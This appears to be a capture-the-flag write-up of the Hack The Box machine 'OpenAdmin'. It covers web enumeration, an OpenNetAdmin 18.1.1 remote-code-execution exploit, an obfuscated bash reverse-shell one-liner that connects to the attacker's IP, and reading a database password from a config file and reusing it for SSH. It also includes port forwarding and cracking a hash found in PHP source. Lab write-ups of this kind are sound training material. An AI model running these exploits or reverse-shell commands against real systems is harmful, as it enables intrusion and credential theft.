# OpenAdmin 

![image](https://user-images.githubusercontent.com/5285547/124369170-d137d380-dc60-11eb-90cd-9aca9d30f8ef.png)

## Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


## Port 80

Using gobuster i enumerated port 80 as only the default apache page loaded. 

```
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/] 
```

### Artwork

http://10.10.10.171/artwork/index.html

- Gobuster
```
/index.html           (Status: 200) [Size: 14461]
/images               (Status: 301) [Size: 321] [--> http://10.10.10.171/artwork/images/]
/main.html            (Status: 200) [Size: 931]                                          
/services.html        (Status: 200) [Size: 11749]                                        
/about.html           (Status: 200) [Size: 11156]                                        
/contact.html         (Status: 200) [Size: 8999]                                         
/blog.html            (Status: 200) [Size: 11523]                                        
/css                  (Status: 301) [Size: 318] [--> http://10.10.10.171/artwork/css/]   
/readme.txt           (Status: 200) [Size: 410]                                          
/js                   (Status: 301) [Size: 317] [--> http://10.10.10.171/artwork/js/]    
/fonts                (Status: 301) [Size: 320] [--> http://10.10.10.171/artwork/fonts/] 
/single.html          (Status: 200) [Size: 17627]  
```

### Sierra

http://10.10.10.171/sierra/index.html

- Gobuster
```
/contact.html         (Status: 200) [Size: 15853]
/blog.html            (Status: 200) [Size: 20477]
/index.html           (Status: 200) [Size: 43029]
/img                  (Status: 301) [Size: 317] [--> http://10.10.10.171/sierra/img/]
/service.html         (Status: 200) [Size: 22090]                                    
/css                  (Status: 301) [Size: 317] [--> http://10.10.10.171/sierra/css/]
/portfolio.html       (Status: 200) [Size: 13000]                                    
/js                   (Status: 301) [Size: 316] [--> http://10.10.10.171/sierra/js/] 
/about-us.html        (Status: 200) [Size: 20785]                                    
/elements.html        (Status: 200) [Size: 24524]                                    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.10.171/sierra/fonts/]
/vendors              (Status: 301) [Size: 321] [--> http://10.10.10.171/sierra/vendors/]
```

Not a lot on the above two sites.

### Music

http://10.10.10.171/music/index.html

- Gobuster
```
/img                  (Status: 301) [Size: 316] [--> http://10.10.10.171/music/img/]
/contact.html         (Status: 200) [Size: 6223]                                    
/blog.html            (Status: 200) [Size: 6728]                                    
/main.html            (Status: 200) [Size: 931]                                     
/category.html        (Status: 200) [Size: 23863]                                   
/index.html           (Status: 200) [Size: 12554]                                   
/css                  (Status: 301) [Size: 316] [--> http://10.10.10.171/music/css/]
/js                   (Status: 301) [Size: 315] [--> http://10.10.10.171/music/js/] 
/artist.html          (Status: 200) [Size: 20133]                                   
/playlist.html        (Status: 200) [Size: 8885] 
```

I found a login button but it redirects to ../ona

![image](https://user-images.githubusercontent.com/5285547/124369606-4c02ed80-dc65-11eb-9237-46b771469cd4.png)


## www-data

Going to http://10.10.10.171/ona/   
gives us the openNetAdmin interface with ```verson 18.1.1```

Finding an exploit online I crafted my own from this example: https://packetstormsecurity.com/files/162516/opennetadmin85141811-exec.txt

My Exploit: https://github.com/AssassinUKG/Writeups/tree/main/hackthebox/dare/openadmin/opennetadmin

```
bash openNetAdmin.sh http://10.10.10.171/ona/ id
```

Usng my shell I was able to get a reverseshell from the box. 

Command used (bash revshell + base64 encoded + urlencoding)
```
echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNS85OTg4IDA%2BJjE%3D | base64 -d| bash
```

![image](https://user-images.githubusercontent.com/5285547/124384929-76879180-dccb-11eb-97d1-1c6e1faadf0c.png)

Upgrade your shell as usual...
```
python3 -c 'import pty;pty.spwan("/bin/bash")'
stty raw -echo;fg
reset
xterm
```

Looking aroud the system I finally find the database config file loacated
```
/var/www/html/ona/local/config/database_settings.inc.php
```
```
'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
```

## Jimmy (User 1)

Trying the password for the database on the system users. Let's us in as Jimmy  

![image](https://user-images.githubusercontent.com/5285547/124386200-227fab80-dcd1-11eb-9a06-80a8599a6d09.png)

The password also works for SSH! 

```
ssh jimmy@10.10.10.171
```

Checking out the local ports shows us an internal website being hosted on port 52846

```
jimmy@openadmin:~$ netstat -ltup 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:52846         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
udp        0      0 localhost:domain        0.0.0.0:*                           - 
```

Let's port portward over SSH to see whats on the page. 

```
ssh jimmy@10.10.10.171 -L 80:127.0.0.1:52846
```

We are presented with a login screen. 

![image](https://user-images.githubusercontent.com/5285547/124386625-34fae480-dcd3-11eb-8da4-34d0ac0e93b4.png)

We should try to find more infomation in the files being hosted. 
```/var/www/internal```

Looking at the index.php page we can see a password hash, time to crack that! 

```
  <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
```

Using an online site, I got the password for the login

![image](https://user-images.githubusercontent.com/5285547/124388806-61ffc500-dcdc-11eb-97d4-898cb65ccad9.png)


